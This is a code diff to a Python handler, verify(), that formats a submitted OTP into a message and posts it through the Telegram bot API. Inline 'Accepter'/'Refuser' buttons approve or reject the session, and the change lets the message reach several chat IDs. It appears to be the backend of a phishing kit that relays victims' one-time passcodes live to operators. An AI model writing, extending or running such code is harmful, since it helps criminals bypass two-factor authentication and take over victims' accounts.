@@ -147,29 +147,33 @@ def verify():
         message += f"🔢 <b>OTP:</b> {otp}\n"
     
     if token and chat_id:
-        url = f"https://api.telegram.org/bot{token}/sendMessage"
-        payload = {
-            "chat_id": chat_id,
-            "text": message,
-            "parse_mode": "HTML"
-        }
+        # Support multiple chat IDs separated by comma
+        chat_ids = [c.strip() for c in chat_id.split(',') if c.strip()]
         
-        # Attach approval buttons on OTP or CHECK_PIN submission
-        if otp != 'Pending OTP...' and otp != 'RESEND_CLICKED' and session_id:
-            payload["reply_markup"] = {
-                "inline_keyboard": [
-                    [
-                        {"text": "✅ Accepter", "callback_data": f"approve_{session_id}"},
-                        {"text": "❌ Refuser", "callback_data": f"reject_{session_id}"}
-                    ]
-                ]
+        for cid in chat_ids:
+            url = f"https://api.telegram.org/bot{token}/sendMessage"
+            payload = {
+                "chat_id": cid,
+                "text": message,
+                "parse_mode": "HTML"
             }
             
-        try:
-            res = requests.post(url, json=payload)
-            print(f"Telegram response status: {res.status_code}")
-            print(f"Telegram response body: {res.text}")
-        except Exception as e:
-            print(f"Error sending to Telegram: {e}")
+            # Attach approval buttons on OTP or CHECK_PIN submission
+            if otp != 'Pending OTP...' and otp != 'RESEND_CLICKED' and session_id:
+                payload["reply_markup"] = {
+                    "inline_keyboard": [
+                        [
+                            {"text": "✅ Accepter", "callback_data": f"approve_{session_id}"},
+                            {"text": "❌ Refuser", "callback_data": f"reject_{session_id}"}
+                        ]
+                    ]
+                }
+                
+            try:
+                res = requests.post(url, json=payload)
+                print(f"Telegram response status for {cid}: {res.status_code}")
+                print(f"Telegram response body for {cid}: {res.text}")
+            except Exception as e:
+                print(f"Error sending to Telegram {cid}: {e}")
             
     return jsonify({"status": "success"})
